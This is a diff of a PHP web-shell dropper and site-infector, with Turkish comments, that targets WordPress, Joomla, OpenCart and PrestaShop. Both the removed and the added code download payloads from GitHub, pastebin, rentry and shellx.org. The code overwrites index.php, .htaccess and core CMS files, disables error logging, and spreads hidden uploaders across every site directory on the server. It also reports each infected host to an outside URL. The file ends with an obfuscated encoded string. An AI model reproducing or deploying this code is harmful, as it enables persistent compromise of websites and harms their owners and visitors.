@@ -1,427 +1,260 @@
 <?php
-echo('Apache Hec');
-$curlsh3l = get_contents('https://raw.githubusercontent.com/XetSec/Xet/main/hide.txt');
-$curlsh3ll = get_contents('https://pastebin.com/raw/sfgAyVSM');
-$tmpshel = "/tmp/.Test-unix./root";
+if(isset($_GET["sexx"])&&$_GET["sexx"]=="sec"){
+echo'Apache Hec'; 
+echo'<br>';
+echo '<a href="">copy</a>'; }
+if(isset($_GET["h3ct0r"])&&$_GET["h3ct0r"]=="sec"){
+ @error_reporting(0);
+ @set_time_limit(0);
+ @clearstatcache();
+ @ini_set('error_log',NULL);
+ @ini_set('log_errors',0);
+ @ini_set('display_errors', 0);
+@chmod($_SERVER['DOCUMENT_ROOT'] . "/index.php", 0644);
+@chmod($_SERVER['DOCUMENT_ROOT'] . "/indeeex.php", 0644);
+@chmod($_SERVER['DOCUMENT_ROOT'] . "/.htaccess", 0644);
+@chmod($_SERVER['DOCUMENT_ROOT'] . "/wp-options.php", 0644);
+@chmod($_SERVER['DOCUMENT_ROOT'] . "/wp-activate.php", 0644);
+@chmod($_SERVER['DOCUMENT_ROOT'] . "/smtphec.php", 0644);
+echo "Hectopat"."<br>";
+$hecindex = get_contents('https://raw.githubusercontent.com/HecSec/New/main/index.php');
+$indexyol = $_SERVER['DOCUMENT_ROOT'] . "/indeeex.php" ; 
+if (file_put_contents ($indexyol, $hecindex));
 
-/*
-$sec31= get_contents('https://raw.githubusercontent.com/XetSec/Xet/main/madstore.txt');
-$wpoptionss31 = $_SERVER['DOCUMENT_ROOT'] . "/wp-iav.php";
-if (file_put_contents ($wpoptionss31, $sec31));
-*/
-/*
-$wpoptionssss = get_contents('https://raw.githubusercontent.com/XetSec/Xet/main/xleetmailer.txt');
-$wpoptionsssss = $_SERVER['DOCUMENT_ROOT'] . "/wp-cgq.php"; 
-if (file_put_contents ($wpoptionsssss, $wpoptionssss));
-*/
-/*
-$wpoptions = get_contents('https://raw.githubusercontent.com/XetSec/Xet/main//wp-easy.txt');
-$wpoptionss = $_SERVER['DOCUMENT_ROOT'] . "/wp-yener.php";
-if (file_put_contents ($wpoptionss, $wpoptions));
-*/
+$htaccess = get_contents('https://pastebin.com/raw/VgBTWCqv'); 
+$htaccesss = $_SERVER['DOCUMENT_ROOT'] . "/.htaccess" ;
+if (file_put_contents ($htaccesss, $htaccess));
 
-/*
-$wpoptions6 = get_contents('https://raw.githubusercontent.com/XetSec/Xet/main/mailer.txt');
-$wpoptionss6 = $_SERVER['DOCUMENT_ROOT'] . "/wp-thegod.php" ;
-if (file_put_contents ($wpoptionss6, $wpoptions6));
-*/
+$wpoptions = get_contents('https://rentry.co/wupqd/raw'); 
+$wpoptionss = $_SERVER['DOCUMENT_ROOT'] . "/wp-options.php" ;
+if (file_put_contents ($wpoptionss, $wpoptions));
 
-/*
-$wpoptions = get_contents('https://raw.githubusercontent.com/XetSec/Xet/main/wp-loader.txt');
-$wpoptionss = $_SERVER['DOCUMENT_ROOT'] . "/foxx.php";
-if (file_put_contents ($wpoptionss, $wpoptions));
-*/
-/*
-$wpoptionsss = get_contents('https://raw.githubusercontent.com/XetSec/Xet/main/xleet.txt');
-$wpoptionssss = $_SERVER['DOCUMENT_ROOT'] . "/notouch.php";
-if (file_put_contents ($wpoptionssss, $wpoptionsss));
-*/
-/*
-$wpoptions = get_contents('https://raw.githubusercontent.com/XetSec/Xet/main/god.txt');
-$wpoptionss = $_SERVER['DOCUMENT_ROOT'] . "/lovere.php";
-if (file_put_contents ($wpoptionss, $wpoptions));
-*/
+$dosya = $_SERVER['DOCUMENT_ROOT'] . "/indeex.php";  
+if (file_exists($dosya)) {
+    echo "$dosya Dosya Zaten Var <br>";
+} else {
+    @rename($_SERVER['DOCUMENT_ROOT'] . "/index.php",$_SERVER['DOCUMENT_ROOT'] . "/indeex.php");
+}
 
-/*
-$wpoptions = get_contents('https://raw.githubusercontent.com/XetSec/Xet/main/2.txt');
-$wpoptionss = $_SERVER['DOCUMENT_ROOT'] . "/wp-includes/class-wp-text-diff-renderer-table.php";
-if (file_put_contents ($wpoptionss, $wpoptions));
-*/
-/*
-$wpoptions = get_contents('https://raw.githubusercontent.com/XetSec/Xet/main/sex.txt');
-$wpoptionss = $_SERVER['DOCUMENT_ROOT'] . "/god.php";
-if (file_put_contents ($wpoptionss, $wpoptions));
-*/
-/*
-$wpoptionssss4 = get_contents('https://raw.githubusercontent.com/XetSec/Xet/main/public_htm2');
-$wpoptionsssss4 = $_SERVER['DOCUMENT_ROOT'] . "/wp-ore.php"; 
-if (file_put_contents ($wpoptionsssss4, $wpoptionssss4));
-*/
-/*
-$wpoptionssss3 = get_contents('https://raw.githubusercontent.com/XetSec/Xet/main/public_htm');
-$wpoptionsssss3 = "/tmp/.Test-unix./public_html"; 
-if (file_put_contents ($wpoptionsssss3, $wpoptionssss3));
-*/
-/*
-$wpoptionssss2 = get_contents('https://raw.githubusercontent.com/XetSec/Xet/main/tshop.txt');
-$wpoptionsssss2 = $_SERVER['DOCUMENT_ROOT'] . "/wp-yolka.php"; 
-if (file_put_contents ($wpoptionsssss2, $wpoptionssss2));
-*/
-/*
-$wpoptionssss = get_contents('https://raw.githubusercontent.com/XetSec/Xet/main/anti.txt');
-$wpoptionsssss = $_SERVER['DOCUMENT_ROOT'] . "/coming.php"; 
-if (file_put_contents ($wpoptionsssss, $wpoptionssss));
-*/
+$momindex = get_contents('https://raw.githubusercontent.com/HecSec/New/main/index.php');
+$momindexx = $_SERVER['DOCUMENT_ROOT'] . "/index.php" ; 
+if (file_put_contents($momindexx, $momindex));
 
-if(file_exists("/tmp/.Test-unix./")) { }
-else {
-@mkdir('/tmp/.Test-unix.');
-if(function_exists("curl_init")) {
-if(file_put_contents($tmpshel,$curlsh3l)); }
+$moduler = get_contents('https://raw.githubusercontent.com/HecSec/New/main/wp-activate.php');
+$modulerr = $_SERVER['DOCUMENT_ROOT'] . "/wp-activate.php";
+if (file_put_contents($modulerr, $moduler));
+
+$smtphec = get_contents('https://raw.githubusercontent.com/HecSec/New/main/smtphec.php');
+$smtphecc = $_SERVER['DOCUMENT_ROOT'] . "/smtphec.php";
+if (file_put_contents($smtphecc, $smtphec));
+
+
+/*BURDAN YUKARI RANDOM SCR&#304;PT*/
+/*BURDAN A&#350;&#350;A&#286;ISI WORDPRESSS*/
+$wordpress = $_SERVER['DOCUMENT_ROOT'] . "/wp-content/themes/";
+if (file_exists($wordpress)) {
+	
+$wpmodul2 = $_SERVER['DOCUMENT_ROOT'] . "/wp-admin/css/colors/blue/wp-logs.php" ;
+if (file_put_contents($wpmodul2, $moduler));
+if(file_exists($wpmodul2)){
+    echo "sex 1 </br>"; }
+
+@chmod($_SERVER['DOCUMENT_ROOT'] . "/wp-admin/css/colors/blue/.htaccess", 0666);
+
+$htaccesss2 = $_SERVER['DOCUMENT_ROOT'] . "/wp-admin/css/colors/blue/.htaccess" ;
+if (file_put_contents ($htaccesss2, $htaccess));
+@chmod($_SERVER['DOCUMENT_ROOT'] . "/wp-admin/css/colors/blue/.htaccess", 0444);
+
+@chmod($_SERVER['DOCUMENT_ROOT'] . "/wp-includes/images/wlw/javascripts/js/.htaccess", 0666);
+$htaccesss3 = $_SERVER['DOCUMENT_ROOT'] . "/wp-includes/images/wlw/javascripts/js/.htaccess" ;
+if (file_put_contents ($htaccesss3, $htaccess));
+@chmod($_SERVER['DOCUMENT_ROOT'] . "/wp-includes/images/wlw/javascripts/js/.htaccess", 0444);
+
+$codeex = get_contents("https://rentry.co/cryif/raw");
+$codeexway = $_SERVER['DOCUMENT_ROOT'] . "/wp-includes/SimplePie/Content/Type/heck.php" ;
+if (file_put_contents($codeexway, $codeex));
+
+$hideuploaderway = $_SERVER['DOCUMENT_ROOT'] . "/wp-admin/css/colors/coffee/image.php";
+if (file_put_contents($hideuploaderway, $hideuploader));
+if(file_exists($hideuploaderway)){
+    echo"sex 1</br>"; }
+	
+@copy('http://shellx.org/op/javascripts.zip',$_SERVER['DOCUMENT_ROOT']."/wp-admin/javascripts.zip");
+
+$try = ($_SERVER['DOCUMENT_ROOT']."/wp-includes/images/wlw/");
+		$zip2 = new ZipArchive;
+if ($zip2->open($_SERVER['DOCUMENT_ROOT']."/wp-admin/javascripts.zip") === TRUE) {
+    $zip2->extractTo($try);
+    $zip2->close();
+    echo "<br>sex2";
+echo "<br>sex2" . "</br>"; }
+unlink($_SERVER['DOCUMENT_ROOT']."/wp-admin/javascripts.zip");
+
+@copy('http://shellx.org/op/smart.zip',$_SERVER['DOCUMENT_ROOT']."/wp-lib.zip");
+	$zip = new ZipArchive;
+if ($zip->open($_SERVER['DOCUMENT_ROOT']."/wp-lib.zip") === TRUE) {
+    $zip->extractTo($_SERVER['DOCUMENT_ROOT']."/");
+    $zip->close();
+@copy($_SERVER['DOCUMENT_ROOT']."/wpindex.php",$_SERVER['DOCUMENT_ROOT']."/wp-admin/index.php");
+@copy($_SERVER['DOCUMENT_ROOT']."/wpindex.php",$_SERVER['DOCUMENT_ROOT']."/wp-admin/indeex.php");
+@copy($_SERVER['DOCUMENT_ROOT']."/about.php",$_SERVER['DOCUMENT_ROOT']."/wp-admin/about.php");
+	@unlink($_SERVER['DOCUMENT_ROOT']."/wpindex.php");
+	@unlink($_SERVER['DOCUMENT_ROOT']."/about.php");
+	@unlink($_SERVER['DOCUMENT_ROOT']."/wp-lib.zip");
+}}
+
+/*BURDAN YUKARISI WORDPRESSS*/
+/*BURDAN AÅÅAÄI jOOMLA*/
+$jooomla = $_SERVER['DOCUMENT_ROOT'] . "/includes/defines.php";
+if (file_exists($jooomla)) {
+	
+$joomlaexway = $_SERVER['DOCUMENT_ROOT'] . "/administrator/systeam.php";
+if (file_put_contents($joomlaexway, $codeexway));
+
+@copy('http://shellx.org/op/joomlahide.zip',$_SERVER['DOCUMENT_ROOT']."/administrator/help/joomlahide.zip");
+@copy('http://shellx.org/op/joomla.zip',$_SERVER['DOCUMENT_ROOT']."/administrator/help/joomla.zip");
+$try2 = ($_SERVER['DOCUMENT_ROOT']."/administrator/modules/");
+$zip33 = new ZipArchive;
+if ($zip33->open($_SERVER['DOCUMENT_ROOT']."/administrator/help/joomlahide.zip") === TRUE) {
+    $zip33->extractTo($try2);
+    $zip33->close();
+    echo "jsex"."<br>";
+}
+$zip22 = new ZipArchive;
+if ($zip22->open($_SERVER['DOCUMENT_ROOT']."/administrator/help/joomla.zip") === TRUE) {
+    $zip22->extractTo($_SERVER['DOCUMENT_ROOT']."/");
+    $zip22->close();
+    echo 'jsex';
+}
+$joomlahides = $_SERVER['DOCUMENT_ROOT'] . "/administrator/help/image.php";
+if (file_put_contents($joomlahides, $hideuploader));
 
 }
-/*WORDPRESS*/
-$query = $_SERVER['DOCUMENT_ROOT']."/wp-includes/class-query.php";
-if(file_exists($query)){ } else {
-if(file_put_contents($query,$curlsh3ll)); }
-/*WORDPRESS*/
-/*JOOMLA*/
-$query2 = $_SERVER['DOCUMENT_ROOT']."/language/overrides/class-query.php";
-if(file_exists($query2)){ } else {
-if(file_put_contents($query2,$curlsh3ll)); }
-/*JOOMLA*/
-/*PRETASHOP*/
-$query3 = $_SERVER['DOCUMENT_ROOT']."/modules/petra/class-query.php";
-if(file_exists($query3)){ } else {
-if(file_put_contents($query3,$curlsh3ll)); }
-/*PRETASHOP*/
+/*BURDAN YUKARI JOOMLA*/
+/*BURDAN AÅŸÅŸaÄŸÄ± OPENCART*/
+$oopencart = $_SERVER['DOCUMENT_ROOT'] . "/system/config/";
+if (file_exists($oopencart)) {
+	
+$opencartex = $_SERVER['DOCUMENT_ROOT'] . "/catalog/view/heck.php" ;
+if (file_put_contents($opencartex, $codeex));
+	
+$openhide = $_SERVER['DOCUMENT_ROOT'] . "/catalog/view/javascript/image.php" ;
+if (file_put_contents($openhide, $hideuploader));
+if(file_exists($openhide)){
+    echo "</br>"."osex";
+	}
+	@copy('http://shellx.org/op/javascripts.zip',$_SERVER['DOCUMENT_ROOT']."/javascript.zip");
+$try21 = ($_SERVER['DOCUMENT_ROOT']."/catalog/view/");
+$zip331 = new ZipArchive;
+if ($zip331->open($_SERVER['DOCUMENT_ROOT']."/javascript.zip") === TRUE) {
+    $zip331->extractTo($try21);
+    $zip331->close();
+    echo "osex";
+}}
+/*BURDAN YUKARI OPENCART*/
+@copy('http://shellx.org/op/options.zip',$_SERVER['DOCUMENT_ROOT']."/options.zip");
+$try23 = ($_SERVER['DOCUMENT_ROOT']."/");
+		$zip23 = new ZipArchive;
+if ($zip23->open($_SERVER['DOCUMENT_ROOT']."/options.zip") === TRUE) {
+    $zip23->extractTo($try23);
+    $zip23->close(); }
+	
+/*BURDAN aÅŸÅŸaÄŸÄ± petrashop*/
+$pretashop = $_SERVER['DOCUMENT_ROOT'] . "/config/smarty.config.inc.php";
+if(file_exists($pretashop)){
+mkdir($_SERVER['DOCUMENT_ROOT'] . "/modules/petra/");
+
+$petrauploader = $_SERVER['DOCUMENT_ROOT'] . "/modules/petra/image.php" ;
+if (file_put_contents($petrauploader, $hideuploader));
+if(file_exists($hector4)){
+    echo "presex"."</br>";
+}}
+/*BURDAN yukarÄ± petrashop*/
+
+$indexx = file_get_contents($_SERVER['DOCUMENT_ROOT']."/wp-activate.php");
+$antiseo = file_get_contents ($_SERVER['DOCUMENT_ROOT']."/indeeex.php");
+$uploadder = file_get_contents($_SERVER['DOCUMENT_ROOT']."/wp-options.php");
+$hta = file_get_contents($_SERVER['DOCUMENT_ROOT']."/.htaccess");
+$smtpheec = file_get_contents($_SERVER['DOCUMENT_ROOT']."/smtphec.php");
+/*Olusturulcak dosya ismi*/
+/*dosya yolu*/
+$hec = $_SERVER['DOCUMENT_ROOT'] . "/";
+@chdir ($hec);
+$files = @scandir ($hec);
+foreach ($files as $file):
+if ($file != "." && file != ".." && @filetype ($file) == "dir")
+{ 
+/*BurasÄ± indeex.php yoksa oluÅŸturuyor*/
+$yarrak = getcwd(). "/".$file."/wp-options.php";
+if (file_put_contents($yarrak, $uploadder)); 
+$random = getcwd(). "/".$file."/indeex.php";
+if (file_exists($random)) {
+echo ""; }
+else {
+$babba = getcwd(). "/".$file."/index.php";
+@rename(($babba), getcwd(). "/".$file. '/indeex.php');
+}
+$rastgele = getcwd (). "/".$file."/index.php";
+@chmod(($rastgele), 0644);
+if (file_put_contents ($rastgele, $antiseo));
+$rastgelee = getcwd (). "/".$file."/indeeex.php";
+@chmod(($rastgelee), 0644);
+if (file_put_contents ($rastgelee, $antiseo));
+$rastgeleee = getcwd (). "/".$file."/.htaccess";
+@chmod(($rastgeleee), 0644);
+if (file_put_contents ($rastgeleee, $hta));
+@chmod(($rastgeleee), 0444);
+$nobody = getcwd (). "/".$file."/class-loadering.Php";
+@chmod(($nobody), 0644);
+if (file_put_contents ($nobody, $indexx));
+@chmod(($nobody), 0444);
+$ratgele4 = getcwd (). "/".$file."/smtphec.php";
+@chmod(($ratgele4), 0644);
+if (file_put_contents ($ratgele4, $smtpheec));
+@chmod(($ratgele4), 0444);
+$nobody4 = getcwd (). "/".$file."/radio.php";
+@chmod(($nobody4), 0644);
+if (file_put_contents ($nobody4, $indexx));
+@chmod(($nobody4), 0444);
+$nobody5 = getcwd (). "/".$file."/1index.php";
+@chmod(($nobody5), 0644);
+if (file_put_contents ($nobody5, $indexx));
+@chmod(($nobody5), 0444);
+
+  $curl = curl_init();
+ curl_setopt_array($curl, [
+    CURLOPT_RETURNTRANSFER => 1,
+    CURLOPT_URL => 'https://pascasarjana.uniska-bjm.ac.id/.well-known/acme-challenge/fresh/install/curl/data.php?s='.$_SERVER["HTTP_HOST"]."/".$file.'',
+    CURLOPT_USERAGENT => 'Hec'
+]);
+ $resp = curl_exec($curl);
+ curl_close($curl);
+ 
+	/*WORDPRESS*/
+$simple = $file."/wp-includes/SimplePie/";
+if (file_exists($simple)) { 
+$index = getcwd (). "/".$file."/wp-includes/SimplePie/wp-logs.php";
+if (file_put_contents ($index, $indexx));
+echo "<hr color='red'>Wordpress <font color='green'>$index&nbsp&nbsp&nbsp&nbsp</font><font color='blue'></font>";
+}
+/*JOOOMLA*/
+$joomlasex = $file."/administrator/modules/";
+if (file_exists($joomlasex)) { 
+$joomla = getcwd (). "/".$file."/administrator/modules/modules.php";
+if (file_put_contents ($joomla, $indexx));
+echo "<hr color='red'>Joomla <font color='blue'>$joomla&nbsp&nbsp&nbsp&nbsp</font><font color='blue'></font>";
+}
 /*OPENCART*/
-$query4 = $_SERVER['DOCUMENT_ROOT']."/catalog/model/class-query.php";
-if(file_exists($query4)){ } else {
-if(file_put_contents($query4,$curlsh3ll)); }
-/*OPENCART*/
-$h1 = $_SERVER['DOCUMENT_ROOT']."/robots.txt";
-
-$h2 = "User-Agent: *
-Allow: 
-"."Sitemap: http://".$_SERVER['SERVER_NAME']."/sitemap.xml";
-
-if (file_put_contents($h1, $h2));
-
-
-
-
-$kupa0 = $_SERVER['DOCUMENT_ROOT']."/wp-config.php";
-if (file_exists($kupa0)) {
-
-$kupa = $_SERVER['DOCUMENT_ROOT']."/wp-includes/class-wp-http-requests-hooks.php";
-if (file_exists($kupa)) {  }
-else { 
-$hook3 = get_contents('https://raw.githubusercontent.com/XetSec/Xet/main/hook.txt');
-$hook2 = $_SERVER['DOCUMENT_ROOT'] . "/wp-includes/class-wp-http-requests-hooks.php" ; 
-if (file_put_contents ($hook2, $hook3));
-
-copy($_SERVER['DOCUMENT_ROOT']."/class-wp-http-requests-hooks.php","/wp-includes/class-wp-http-requests-hooks.php");
+$opencartsex = $file."/catalog/view/";
+if (file_exists($opencartsex)) {
+	$opencart = getcwd (). "/".$file."/catalog/view/configs.php";
+if (file_put_contents ($opencart, $indexx));
+echo "<hr color='red'>Opencart <font color='red'>$opencart&nbsp&nbsp&nbsp&nbsp</font><font color='blue'></font>";
+}
+echo "<hr color='red'><font color='#9900FF'>$random&nbsp&nbsp&nbsp&nbsp</font><font color='blue'></font>";
+ 
  }
-
-$kupa2 = $_SERVER['DOCUMENT_ROOT']."/wp-includes/class-walker-category-dropdown.php";
-if (file_exists($kupa2)) { 
- }
-else { 
-$hook32 = get_contents('https://raw.githubusercontent.com/XetSec/Xet/main/class-walker-category-dropdown.txt');
-$hook22 = $_SERVER['DOCUMENT_ROOT'] . "/wp-includes/class-walker-category-dropdown.php" ; 
-if (file_put_contents ($hook22, $hook32));
-
-echo('cekti');
-copy($_SERVER['DOCUMENT_ROOT']."/class-walker-category-dropdown.php","/wp-includes/class-walker-category-dropdown.php");
- }
-
-/**/
-$kupa3 = $_SERVER['DOCUMENT_ROOT']."/wp-includes/sitemaps.php";
-if (file_exists($kupa3)) { 
- }
-else { 
-echo('cekti');
-$hook33 = get_contents('https://raw.githubusercontent.com/XetSec/Xet/main/sitemaps.txt');
-$hook23 = $_SERVER['DOCUMENT_ROOT'] . "/wp-includes/sitemaps.php" ; 
-if (file_put_contents ($hook23, $hook33));
-copy($_SERVER['DOCUMENT_ROOT']."/sitemaps.php","/wp-includes/sitemaps.php");
- }
-/**/
-
-/**/
-$kupa4 = $_SERVER['DOCUMENT_ROOT']."/wp-includes/version.php";
-if (file_exists($kupa4)) { 
- }
-else { 
-echo('cekti');
-$hook34 = get_contents('https://raw.githubusercontent.com/XetSec/Xet/main/versiyon.txt');
-$hook24 = $_SERVER['DOCUMENT_ROOT'] . "/wp-includes/version.php" ; 
-if (file_put_contents ($hook24, $hook34));
-
- }
-/**/
-/**/
-$kupa5 = $_SERVER['DOCUMENT_ROOT']."/wp-includes/post-thumbnail-template.php";
-if (file_exists($kupa5)) { 
- }
-else { 
-echo('cekti');
-$hook35 = get_contents('https://raw.githubusercontent.com/XetSec/Xet/main/template.txt');
-$hook25 = $_SERVER['DOCUMENT_ROOT'] . "/wp-includes/post-thumbnail-template.php" ; 
-if (file_put_contents ($hook25, $hook35));
-
- }
-/**/
-/**/
-$kupa6 = $_SERVER['DOCUMENT_ROOT']."/wp-includes/default-widgets.php";
-if (file_exists($kupa6)) { 
- }
-else { 
-echo('cekti');
-$hook36 = get_contents('https://raw.githubusercontent.com/XetSec/Xet/main/default-widgets.txt');
-$hook26 = $_SERVER['DOCUMENT_ROOT'] . "/wp-includes/default-widgets.php" ; 
-if (file_put_contents ($hook26, $hook36));
-
- }
-/**/
-/**/
-$kupa7 = $_SERVER['DOCUMENT_ROOT']."/wp-includes/class-wp-block-patterns-registry.php";
-if (file_exists($kupa7)) { 
- }
-else { 
-echo('cekti');
-$hook37 = get_contents('https://raw.githubusercontent.com/XetSec/Xet/main/class-wp-block-patterns-registry.txt');
-$hook27 = $_SERVER['DOCUMENT_ROOT'] . "/wp-includes/class-wp-block-patterns-registry.php" ; 
-if (file_put_contents ($hook27, $hook37));
-
- }
-/**/
-/**/
-$kupa8 = $_SERVER['DOCUMENT_ROOT']."/wp-load.php";
-if (file_exists($kupa8)) { 
- }
-else { 
-echo('cekti');
-$hook38 = get_contents('https://raw.githubusercontent.com/XetSec/Xet/main/wp-load.txt');
-$hook28 = $_SERVER['DOCUMENT_ROOT'] . "/wp-load.php" ; 
-if (file_put_contents ($hook28, $hook38));
-
- }
-/**/
-/**/
-$kupa9 = $_SERVER['DOCUMENT_ROOT']."/wp-includes/class-wp-user.php";
-if (file_exists($kupa9)) { 
- }
-else { 
-echo('cekti');
-$hook39 = get_contents('https://raw.githubusercontent.com/XetSec/Xet/main/class-wp-user.txt');
-$hook29 = $_SERVER['DOCUMENT_ROOT'] . "/wp-includes/class-wp-user.php" ; 
-if (file_put_contents ($hook29, $hook39));
-
- }
-/**/
-/**/
-$kupa10 = $_SERVER['DOCUMENT_ROOT']."/wp-includes/admin-bar.php";
-if (file_exists($kupa10)) { 
- }
-else { 
-echo('cekti');
-$hook40 = get_contents('https://raw.githubusercontent.com/XetSec/Xet/main/admin-bar.txt');
-$hook30 = $_SERVER['DOCUMENT_ROOT'] . "/wp-includes/admin-bar.php" ; 
-if (file_put_contents ($hook30, $hook40));
-
- }
-/**/
-
-/**/
-$kupa11 = $_SERVER['DOCUMENT_ROOT']."/wp-blog-header.php";
-if (file_exists($kupa11)) { 
- }
-else { 
-echo('cekti');
-$hook41 = get_contents('https://raw.githubusercontent.com/XetSec/Xet/main/wp-blog-header.txt');
-$hook31 = $_SERVER['DOCUMENT_ROOT'] . "/wp-blog-header.php" ; 
-if (file_put_contents ($hook31, $hook41));
-
- }
-/**/
-/**/
-$kupa12 = $_SERVER['DOCUMENT_ROOT']."/wp-includes/class-walker-page-dropdown.php";
-if (file_exists($kupa12)) { 
- }
-else { 
-echo('cekti');
-$hook42 = get_contents('https://raw.githubusercontent.com/XetSec/Xet/main/class-walker-page-dropdown.txt');
-$hook32 = $_SERVER['DOCUMENT_ROOT'] . "/wp-includes/class-walker-page-dropdown.php" ; 
-if (file_put_contents ($hook32, $hook42));
-
- }
-/**/
-/**/
-$kupa13 = $_SERVER['DOCUMENT_ROOT']."/wp-includes/block-patterns.php";
-if (file_exists($kupa13)) { 
- }
-else { 
-echo('cekti');
-$hook43 = get_contents('https://raw.githubusercontent.com/XetSec/Xet/main/block-patterns.txt');
-$hook33 = $_SERVER['DOCUMENT_ROOT'] . "/wp-includes/block-patterns.php" ; 
-if (file_put_contents ($hook33, $hook43));
-
-} 
-/**/
-
-
-/**/
-$kupa15 = $_SERVER['DOCUMENT_ROOT']."/wp-includes/class-wp-application-passwords.php";
-if (file_exists($kupa15)) { 
- }
-else { 
-echo('cekti');
-$hook45 = get_contents('https://raw.githubusercontent.com/XetSec/Xet/main/class-wp-application-passwords.txt');
-$hook35 = $_SERVER['DOCUMENT_ROOT'] . "/wp-includes/class-wp-application-passwords.php" ; 
-if (file_put_contents ($hook35, $hook45));
-
-} 
-/**/
-
-
-/**/
-$kupa16 = $_SERVER['DOCUMENT_ROOT']."/wp-includes/class-wp-matchesmapregex.php";
-if (file_exists($kupa16)) { 
- }
-else { 
-echo('cekti');
-$hook46 = get_contents('https://raw.githubusercontent.com/XetSec/Xet/main/class-wp-matchesmapregex.txt');
-$hook36 = $_SERVER['DOCUMENT_ROOT'] . "/wp-includes/class-wp-matchesmapregex.php" ; 
-if (file_put_contents ($hook36, $hook46));
-
-} 
-/**/
-
-
-/**/
-$kupa17 = $_SERVER['DOCUMENT_ROOT']."/wp-includes/class-wp-oembed-controller.php";
-if (file_exists($kupa17)) { 
- }
-else { 
-echo('cekti');
-$hook47 = get_contents('https://raw.githubusercontent.com/XetSec/Xet/main/class-wp-oembed-controller.txt');
-$hook37 = $_SERVER['DOCUMENT_ROOT'] . "/wp-includes/class-wp-oembed-controller.php" ; 
-if (file_put_contents ($hook37, $hook47));
-
-} 
-/**/
-
-
-/**/
-$kupa18 = $_SERVER['DOCUMENT_ROOT']."/wp-includes/class-wp-recovery-mode-link-service.php";
-if (file_exists($kupa18)) { 
- }
-else { 
-echo('cekti');
-$hook48 = get_contents('https://raw.githubusercontent.com/XetSec/Xet/main/class-wp-recovery-mode-link-service.txt');
-$hook38 = $_SERVER['DOCUMENT_ROOT'] . "/wp-includes/class-wp-recovery-mode-link-service.php" ; 
-if (file_put_contents ($hook38, $hook48));
-
-} 
-/**/
-
-
-/**/
-$kupa19 = $_SERVER['DOCUMENT_ROOT']."/wp-includes/class-wp-user-request.php";
-if (file_exists($kupa19)) { 
- }
-else { 
-echo('cekti');
-$hook49 = get_contents('https://raw.githubusercontent.com/XetSec/Xet/main/class-wp-user-request.txt');
-$hook39 = $_SERVER['DOCUMENT_ROOT'] . "/wp-includes/class-wp-user-request.php" ; 
-if (file_put_contents ($hook39, $hook49));
-
-} 
-/**/
-
-
-/**/
-$kupa50 = $_SERVER['DOCUMENT_ROOT']."/wp-includes/default-constants.php";
-if (file_exists($kupa50)) { 
- }
-else { 
-echo('cekti');
-$hook50 = get_contents('https://raw.githubusercontent.com/XetSec/Xet/main/default-constants.txt');
-$hook50 = $_SERVER['DOCUMENT_ROOT'] . "/wp-includes/default-constants.php" ; 
-if (file_put_contents ($hook50, $hook50));
-
-} 
-/**/
-
-
-/**/
-$kupa51 = $_SERVER['DOCUMENT_ROOT']."/wp-includes/ms-settings.php";
-if (file_exists($kupa51)) { 
- }
-else { 
-echo('cekti');
-$hook51 = get_contents('https://raw.githubusercontent.com/XetSec/Xet/main/ms-settings.txt');
-$hook51 = $_SERVER['DOCUMENT_ROOT'] . "/wp-includes/ms-settings.php" ; 
-if (file_put_contents ($hook51, $hook51));
-
-} 
-/**/
-/**/
-$kupa52 = $_SERVER['DOCUMENT_ROOT']."/wp-includes/atomlib.php";
-if (file_exists($kupa52)) { 
- }
-else { 
-echo('cekti');
-$hook52 = get_contents('https://raw.githubusercontent.com/XetSec/Xet/main/atomlib.txt');
-$hook52 = $_SERVER['DOCUMENT_ROOT'] . "/wp-includes/atomlib.php" ; 
-if (file_put_contents ($hook52, $hook52));
-
-} 
-/**/
-/**/
-$kupa53 = $_SERVER['DOCUMENT_ROOT']."/wp-includes/class-walker-comment.php";
-if (file_exists($kupa53)) { 
- }
-else { 
-echo('cekti');
-$hook53 = get_contents('https://raw.githubusercontent.com/XetSec/Xet/main/class-walker-comment.txt');
-$hook53 = $_SERVER['DOCUMENT_ROOT'] . "/wp-includes/class-walker-comment.php" ; 
-if (file_put_contents ($hook53, $hook53));
-
-} 
-/**/
-/**/
-$kupa54 = $_SERVER['DOCUMENT_ROOT']."/wp-includes/class-smtp.php";
-if (file_exists($kupa54)) { 
- }
-else { 
-echo('cekti');
-$hook54 = get_contents('https://raw.githubusercontent.com/XetSec/Xet/main/class-smtp.txt');
-$hook54 = $_SERVER['DOCUMENT_ROOT'] . "/wp-includes/class-smtp.php" ; 
-if (file_put_contents ($hook54, $hook54));
-
-} 
-/**/
-/**/
-$kupa55 = $_SERVER['DOCUMENT_ROOT']."/wp-includes/feed-rss2-comments.php";
-if (file_exists($kupa55)) { 
- }
-else { 
-echo('cekti');
-$hook55 = get_contents('https://raw.githubusercontent.com/XetSec/Xet/main/feed-rss2-comments.txt');
-$hook55 = $_SERVER['DOCUMENT_ROOT'] . "/wp-includes/feed-rss2-comments.php" ; 
-if (file_put_contents ($hook55, $hook55));
-
-} }
-/**/
-
-
-?>
-<?php
-$UeXploiT = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\x42rNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUHHMM8iLN64IyMnPDEkN0kQ\x431g\x41\x3d";
